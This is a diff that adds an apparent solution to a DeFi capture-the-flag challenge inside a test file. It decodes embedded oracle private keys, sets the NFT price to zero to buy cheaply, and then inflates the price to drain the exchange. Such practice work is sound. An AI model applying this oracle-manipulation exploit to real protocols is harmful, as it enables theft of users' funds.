@@ -61,6 +61,46 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const BASE64ENCODED = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4";
+        let middle = BASE64ENCODED.length / 2;
+        expect(middle % 2).to.eq(0);
+
+        var sources = [];
+        sources.push(new ethers.Wallet(
+            atob(BASE64ENCODED.substring(0, middle)),
+            ethers.provider
+        ));
+        sources.push(new ethers.Wallet(
+            atob(BASE64ENCODED.substring(middle, middle * 2)),
+            ethers.provider
+        ));
+        expect(sources[0].address).to.eq("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");
+        expect(sources[1].address).to.eq("0x81A5D6E50C214044bE44cA0CB057fe119097850c");
+
+        // set NFT price to be 0
+        const INITIAL_NFT_PRICE = await this.oracle.getMedianPrice("DVNFT");
+        await this.oracle.connect(sources[0]).postPrice("DVNFT", 0);
+        await this.oracle.connect(sources[1]).postPrice("DVNFT", 0);
+
+        expect(
+            await this.exchange.connect(attacker).buyOne({value: 1})
+        ).to.emit(this.exchange, "TokenBought")
+        .withArgs(attacker.address, 0, 0);
+
+        // set NFT price to be very high
+        await this.oracle.connect(sources[0]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(sources[1]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+
+        expect(
+            await this.exchange.connect(attacker).sellOne(0)
+        ).to.emit(this.exchange, "TokenSold")
+        .withArgs(attacker.address, 0, EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // restore the price of NFT
+        await this.oracle.connect(sources[0]).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(sources[1]).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
